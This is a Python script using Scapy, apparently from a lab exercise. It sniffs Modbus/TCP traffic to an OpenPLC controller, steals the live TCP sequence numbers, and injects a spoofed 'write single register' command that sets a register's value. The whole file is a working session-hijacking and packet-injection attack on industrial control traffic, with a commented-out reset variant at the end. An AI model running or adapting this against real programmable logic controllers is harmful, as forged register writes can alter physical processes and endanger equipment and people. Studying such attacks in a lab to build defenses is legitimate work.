from scapy.all import *

vic_ip = '172.16.192.10' #this is actually the host machine but I needed the TCP values somehow...

flag = 1
while flag:
	OPENPLC_FRAMES = sniff(iface='eth0', count=5, filter = 'dst host 172.16.192.10')
	READ_REGISTER_QUERY = OPENPLC_FRAMES[2] #change from 2 to 0
	READ_REGISTER_ACK = OPENPLC_FRAMES[4] #changed from 3 to 1

	try:
		if "\x00\x01\x00\x00\x00\r\x01\x03\n" in READ_REGISTER_QUERY[Raw].load:
			print("END OF COMMUNICATION LOOP (FINAL QUERY) DETECTED")
			flag=0
	except:
		flag=1

print("PACKET CRAFTING TIME")
tcpdata = {
	'src': READ_REGISTER_ACK[IP].src,
	'dst': READ_REGISTER_ACK[IP].dst,
	'sport': READ_REGISTER_ACK[TCP].sport,
	'dport': READ_REGISTER_ACK[TCP].dport,
	'seq': READ_REGISTER_ACK[TCP].seq + 21,
	'ack': READ_REGISTER_ACK[TCP].ack + 12,
	'wnd': READ_REGISTER_ACK[TCP].window
	}

payload = IP(src=tcpdata['dst'], dst=tcpdata['src']) / \
	TCP(sport=tcpdata['dport'], dport=tcpdata['sport'], flags="PA",
	window=tcpdata['wnd'], seq=tcpdata['ack'], ack=tcpdata['seq'])

class ModbusTCP(Packet):
	name = "ModbusTcp"
	fields_desc = [ ShortField("Transaction Identifier", 1337),
			ShortField("Protocol Identifier", 0),
			ShortField("Length", 6),
			ByteField("Unit Identifier", 1)
			]

class ModbusSet(Packet):
	name = "Modbus"
	fields_desc = [ XByteField("Function Code", 6),
			ShortField("Reference Number", 1),
			ShortField("Data", 1)
			]

class ModbusReset(Packet):
        name = "Modbus"
        fields_desc = [ XByteField("Function Code", 6),
                        ShortField("Reference Number", 0),
                        ShortField("Data", 0)
                        ]


payload = payload/ModbusTCP()/ModbusSet()

print("INJECTION TIME")
send(payload, verbose=0, iface='eth0')

print("AND THAT\'S ALL FOLKS")
payload.display()

resetPayload = payload/ModbusTCP()/ModbusReset()
# testing resetting the register send(resetPayload, verbose=0, iface='eth0')
